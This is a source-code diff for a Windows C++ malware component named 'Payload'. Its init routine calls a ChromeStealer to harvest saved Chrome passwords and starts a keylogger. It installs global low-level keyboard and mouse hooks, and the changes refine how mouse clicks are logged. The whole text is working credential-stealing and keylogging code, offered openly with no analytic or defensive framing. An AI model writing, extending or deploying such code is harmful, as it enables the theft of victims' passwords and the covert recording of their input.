@@ -1,11 +1,10 @@
 #include "Payload.h"
-#include "ChromeStealer.h"
 
 Payload *Payload::current = NULL;
 HINSTANCE Payload::Instance;
 HHOOK Payload::KeyboardHook;
 HHOOK Payload::MouseHook;
-ChromeStealer Cs;
+ChromeStealer Payload::Stealer;
 
 Payload::Payload(void)
 {
@@ -17,17 +16,15 @@ Payload::~Payload(void)
 
 void Payload::init(void)
 {
-	Cs.stealPasswordList();
+	Payload::Stealer.stealPasswordList();
 	_keylogger.init();
 	_ppgt.init();
-	//std::cerr << "Init" << std::endl;
-	//if (Cs.canSteal())
 }
 
 void Payload::createKeyboardHook(void)
 {
 	Payload::KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, Payload::Instance, NULL);
-	Payload::MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, Payload::Instance, NULL); // ok without LL
+	Payload::MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, Payload::Instance, NULL);
 }
 
 void Payload::deleteKeyboardHook(void)
@@ -90,10 +87,13 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		switch (wParam)
 		{
 		case WM_LBUTTONUP:
-			Payload::current->keylogger().mouseClick(mouse);
+			Payload::current->keylogger().mouseClick(MouseEvent::ME_Left, mouse);
 			break;
 		case WM_RBUTTONUP:
-			Payload::current->keylogger().mouseClick(mouse);
+			Payload::current->keylogger().mouseClick(MouseEvent::ME_Right, mouse);
+			break;
+		case WM_MOUSEWHEEL:
+
 			break;
 		};
 	}
